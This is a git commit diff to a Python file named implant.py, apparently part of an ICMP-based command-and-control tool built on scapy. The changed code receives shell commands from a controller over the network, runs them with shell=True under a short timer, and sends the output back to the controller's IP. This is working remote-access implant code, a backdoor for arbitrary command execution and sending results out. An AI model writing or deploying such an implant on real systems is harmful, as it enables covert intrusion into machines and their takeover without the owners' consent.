3dc12f9afba160f4349b30b7547d513745e4e775
Vaughn Woerpel <vaughnwoerpel@gmail.com>
2023-10-14 23:38:02 -0400

    update

--- implant.py
+++ implant.py
@@ -4,6 +4,7 @@ from scapy.all import sr,IP,ICMP,Raw,sniff
 import base64
 import shlex
 from shellylib import Host
+import time
 from threading import Timer
 from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen
 
@@ -15,16 +16,46 @@ class Implant(Host):
     def __init__(self, controller_ip):
         super().__init__()
         self.controller_ip = controller_ip
+        
 
     def join(self, shellpack):
         self.send(shellpack['ip'], "join")
 
+    def run(self, cmd, timeout):
+        time_limit = 2
+        timer = 0
+        time_gap = 0.2
+
+        proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
+
+        ended = False
+        while True:
+            time.sleep(time_gap)
+
+            returncode = proc.poll()
+
+            timer += time_gap
+            if timer >= time_limit:
+                proc.kill()
+                return None
+
+            if returncode is not None:
+                ended = True
+                break
+
+        if ended:
+            out, err = proc.communicate()
+            return out,err
+        else:
+            return None
+
     def instruction(self, shellpack):
         try:
             cmd = shellpack['data'].decode()
-            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
-            stdout = proc.communicate()[0]
-            self.send(self.controller_ip, "instruction", stdout)
+            out,err = self.run(cmd, 3)
+            print(out)
+            print(err)
+            self.send(self.controller_ip, "instruction", out)
             
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
